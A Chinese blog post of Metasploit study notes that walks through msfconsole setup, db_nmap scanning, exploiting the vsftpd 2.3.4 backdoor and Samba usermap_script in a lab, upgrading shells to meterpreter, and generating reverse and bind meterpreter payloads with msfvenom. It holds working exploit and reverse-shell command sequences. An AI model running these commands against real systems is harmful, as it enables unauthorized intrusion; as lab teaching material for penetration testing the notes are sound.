---
title: "MSF 学习笔记-01"
categories: ["工具"]
tags: ["msfconsole", "msfvenom"]
date: 2022-05-15
draft: false
---

- Metasploit框架是一个基于Ruby的模块化渗透测试平台。
- MSFconsole提供了命令行界面来访问和使用Metasploit框架。

## 安装
```bash
$ sudo apt install metasploit-framework -y
$ msfconsole -V
Framework Version: 6.1.14-dev
```

## 启动
### msfdb
管理MSF框架的数据库，启用数据库可以在框架内使用存储、查询、记录功能。使用PGPORT变量可以修改端口号。
```bash
sudo service postgresql start
msfdb init / reinit
msfdb delete
msfdb start / stop / status
msfdb run
```
### run
```bash
sudo msfdb init
# 直接开启数据库并连接msfconsole
sudo msfdb run
# 也可以直接用msfconsole,我们在虚拟机内使用sudo避免过程中权限问题
sudo msfconsole
```

## 使用
进入到msfconsole后先用help熟悉下命令
```bash
msf6> help
...
back
options / show options
advanced/ show advanced // 显示高级参数
connect -> nc/telnet
info // 查看模块的详细信息
jobs
set / unset /get
setg / unsetg
unset all // 移除所有
save // 保存当前环境和设置
search
show
show payloads // 查看当前用的payload
show encoders
run / exploit // 执行
exploit -j // 后台运行
...
```

命令很多，我们按常规的渗透操作流程熟悉一下。

### 连接
```bash
# 查看数据库连接是否正常
db_status

# 工作区管理
workspace
# 列出工作区详情
workspace -v
# 添加 / 删除
workspace -a t1
workspace -d t1
# 切换
workspace t1
```

### 扫描
```bash
# 使用db_nmap运行nmap会自动记录输出结果到数据库
db_nmap
db_nmap -A 192.168.115.130

# 数据库的记录可以导入和导出
db_export -f xml nmap-192.168.115.130.xml
db_import nmap-192.168.115.130.xml

# 查看记录中的主机
hosts -h
    -c <col1,col2> 只显示给定的列
    -o <file> 保存为csv文件
    -S,--search 搜索
    -t,--tag 添加标签
    -R，--rhosts 设置RHOST变量
hosts
hosts -S linux
hosts -c address -R
hosts -S linux -o linux.csv

# 查看记录中的主机
services -h
    -s <name> 服务名称
    -p <port> 端口
    [addr1 addr2]
services
services -p 445
services -o services.csv
services -s http -c port 192.168.115.130
```

### 模块
MSF框架中内置了很多的漏洞利用模块，根据上面的服务发现进行下一步的利用。

Auxiliaries -> Exploits -> Payloads 

use -> options -> set -> exploit/exploit -j

meterpreter -> route -> socks

```bash
# 搜索
search -h
search ms17_010
search type:post
search cve:2009 type:exploit
search cve:2011 platform:linux

# 使用模块
use exploit/multi/handler

# 查看模块详细信息
info
info 0
info exploit/multi/handler

# 使用主机搜索的结果可以联动设置
use auxiliary/scanner/portscan/tcp
hosts -c address -R
run

# 通过搜索的模块进行利用
use exploit/unix/ftp/vsftpd_234_backdoor
# 联动设置RHOST或手动set rhost=x
services -p 21 -R
exploit -j

# 查看获取的会话列表
sessions -l
# 进入到会话
sessions -i 2
# 执行命令
sessions -c ls 2

# 获取到的会话可能是个shell或meterpreter
# shell转换为meterpreter
use post/multi/manage/shell_to_meterpreter
options
set session 2
exploit
# 查看会话列表会发现多了meterpreter会话
sessions -l

# 查看我们获取过的漏洞情况
vulns
vulns -o vulns-1.csv
```

## 自动化
我们通过一系列的步骤在MSF操作后成功拿到了meterpreter会话权限，通过对help中提供的命令查询，发现了2个相关命令，有助于我们进行自动化的配置操作。

- makerc 保存记录到文件
- resource 执行记录文件

```bash
# 保存我们刚刚的操作记录
makerc vsftpd_234_shell.rc
# 去除其他无关的操作命令，保留核心命令
resource vsftpd_234_shell.rc

# 启动时直接执行rc记录文件
msfconsole -r version.rc

# 启动时执行命令
msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 192.168.115.130;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 192.168.115.129;\
run"
```

### msfvenom
有时漏洞利用后会从其他地方反弹一个脆弱的shell会话不方便操作，这时可以用msf模块进行一些payload生成来获取meterpreter会话。
```bash
# msfconsole中生成正向payload
use payload/linux/x86/meterpreter/bind_tcp
set rhost 192.168.115.130

# 反向payload
use payload/linux/x86/meterpreter/reverse_tcp
set lhost 192.168.115.129

# 生成
generate -f elf -o shell.elf
generate -f exe -o shell.exe

# msfvenom命令生成
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=192.168.115.130 -f elf -o shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.115.129 -f elf -o shell.elf

# payload使用
use exploit/multi/handler
set payload linux/x86/meterpreter/bind_tcp
```

## 插件
### wmap
WMAP是一个功能丰富的 Web 应用程序漏洞扫描程序。

测试了下好像不是很好用( ╯□╰ )

```bash
# 加载
load wmap
help wmap

# 管理站点
wmap_sites -h
wmap_sites -a http://192.168.115.130
# 管理目标
wmap_targets -h
wmap_targets -t http://192.168.115.130/admin/
# 列出用于扫描的模块
wmap_run -t 
# 扫描
wmap_run -e
# 显示漏洞
wmap_vulns -l
```